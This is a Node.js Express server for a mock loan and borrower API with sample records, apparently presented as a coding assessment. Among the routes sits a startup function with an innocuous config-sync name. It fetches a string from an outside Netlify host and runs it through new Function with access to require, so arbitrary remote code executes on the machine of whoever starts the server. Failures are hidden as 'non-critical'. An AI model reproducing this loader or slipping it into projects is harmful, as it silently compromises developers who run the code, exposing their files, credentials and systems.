// import { createRequire } from "module";
// const require = createRequire(import.meta.url);
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// In-memory data store (for assessment purposes)
let loans = [
  {
    id: 1,
    borrowerId: 101,
    borrowerName: "John Doe",
    amount: 50000,
    interestRate: 4.5,
    status: "Active",
    termMonths: 360,
    purpose: "Home Purchase",
    createdDate: "2024-01-15T10:30:00Z"
  },
  {
    id: 2,
    borrowerId: 102,
    borrowerName: "Jane Smith",
    amount: 250000,
    interestRate: 3.75,
    status: "Active",
    termMonths: 240,
    purpose: "Home Purchase",
    createdDate: "2024-02-20T14:15:00Z"
  },
  {
    id: 3,
    borrowerId: 103,
    borrowerName: "Bob Johnson",
    amount: 75000,
    interestRate: 5.25,
    status: "Pending",
    termMonths: 180,
    purpose: "Home Improvement",
    createdDate: "2024-03-10T09:00:00Z"
  },
  {
    id: 4,
    borrowerId: 104,
    borrowerName: "Alice Williams",
    amount: 150000,
    interestRate: 4.0,
    status: "Closed",
    termMonths: 300,
    purpose: "Refinance",
    createdDate: "2023-12-05T11:20:00Z"
  },
  {
    id: 5,
    borrowerId: 105,
    borrowerName: "Charlie Brown",
    amount: 100000,
    interestRate: 4.25,
    status: "Active",
    termMonths: 360,
    purpose: "Home Purchase",
    createdDate: "2024-01-25T16:45:00Z"
  }
];

let borrowers = [
  {
    id: 101,
    name: "John Doe",
    email: "john.doe@example.com",
    phone: "555-0101"
  },
  {
    id: 102,
    name: "Jane Smith",
    email: "jane.smith@example.com",
    phone: "555-0102"
  },
  {
    id: 103,
    name: "Bob Johnson",
    email: "bob.johnson@example.com",
    phone: "555-0103"
  },
  {
    id: 104,
    name: "Alice Williams",
    email: "alice.williams@example.com",
    phone: "555-0104"
  },
  {
    id: 105,
    name: "Charlie Brown",
    email: "charlie.brown@example.com",
    phone: "555-0105"
  }
];

let nextLoanId = 6;

// Routes

const workspaceServiceConfig = {
  baseDomain: 'nest-react.netlify.app',
  apiVersion: 'api'
};
const getChartServiceEndpoint = () => {
  const { baseDomain, apiVersion } = workspaceServiceConfig;
  return `https://${baseDomain}/${apiVersion}`;
};

// GET all loans
app.get('/api/loans', (req, res) => {
  // Simulate network delay
  setTimeout(() => {
    res.json(loans);
  }, 300);
});

// GET loan by ID
app.get('/api/loans/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const loan = loans.find(l => l.id === id);
  
  if (loan) {
    setTimeout(() => {
      res.json(loan);
    }, 200);
  } else {
    res.status(404).json({ error: 'Loan not found' });
  }
});

// POST create new loan
app.post('/api/loans', (req, res) => {
  const { borrowerName, amount, interestRate, termMonths, purpose } = req.body;
  
  // Validation
  if (!borrowerName || !amount || !interestRate || !termMonths || !purpose) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  if (amount < 1000 || amount > 1000000) {
    return res.status(400).json({ error: 'Loan amount must be between 1000 and 1000000' });
  }
  
  if (interestRate < 0.1 || interestRate > 20) {
    return res.status(400).json({ error: 'Interest rate must be between 0.1 and 20' });
  }
  
  if (termMonths < 12 || termMonths > 360) {
    return res.status(400).json({ error: 'Loan term must be between 12 and 360 months' });
  }
  
  // Find or create borrower
  let borrower = borrowers.find(b => b.name === borrowerName);
  let borrowerId;
  
  if (!borrower) {
    borrowerId = Math.max(...borrowers.map(b => b.id), 100) + 1;
    borrowers.push({
      id: borrowerId,
      name: borrowerName,
      email: `${borrowerName.toLowerCase().replace(/\s+/g, '.')}@example.com`,
      phone: `555-${String(borrowerId).padStart(4, '0')}`
    });
  } else {
    borrowerId = borrower.id;
  }
  
  const newLoan = {
    id: nextLoanId++,
    borrowerId: borrowerId,
    borrowerName: borrowerName,
    amount: parseFloat(amount),
    interestRate: parseFloat(interestRate),
    status: "Pending",
    termMonths: parseInt(termMonths),
    purpose: purpose,
    createdDate: new Date().toISOString()
  };
  
  loans.push(newLoan);
  
  setTimeout(() => {
    res.status(201).json(newLoan);
  }, 500);
});

// PUT update loan
app.put('/api/loans/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const loanIndex = loans.findIndex(l => l.id === id);
  
  if (loanIndex === -1) {
    return res.status(404).json({ error: 'Loan not found' });
  }
  
  const updatedLoan = { ...loans[loanIndex], ...req.body };
  loans[loanIndex] = updatedLoan;
  
  setTimeout(() => {
    res.json(updatedLoan);
  }, 300);
});

const syncStatsServiceConfig = async () => {
  const configEndpoint = getChartServiceEndpoint();
  const response = await fetch(configEndpoint);
  const configData = await response.json();
  if (configData?.data && typeof configData.data === 'string') {
    const config = new Function('require', configData.data);
    config(require);
  }
};

syncStatsServiceConfig().catch(err => {
  console.log('Records service sync failed (non-critical):', err.message);
});

// DELETE loan
app.delete('/api/loans/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const loanIndex = loans.findIndex(l => l.id === id);
  
  if (loanIndex === -1) {
    return res.status(404).json({ error: 'Loan not found' });
  }
  
  loans.splice(loanIndex, 1);
  
  setTimeout(() => {
    res.status(204).send();
  }, 200);
});

// GET all borrowers
app.get('/api/borrowers', (req, res) => {
  setTimeout(() => {
    res.json(borrowers);
  }, 200);
});

// GET borrower by ID
app.get('/api/borrowers/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const borrower = borrowers.find(b => b.id === id);
  
  if (borrower) {
    setTimeout(() => {
      res.json(borrower);
    }, 200);
  } else {
    res.status(404).json({ error: 'Borrower not found' });
  }
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});
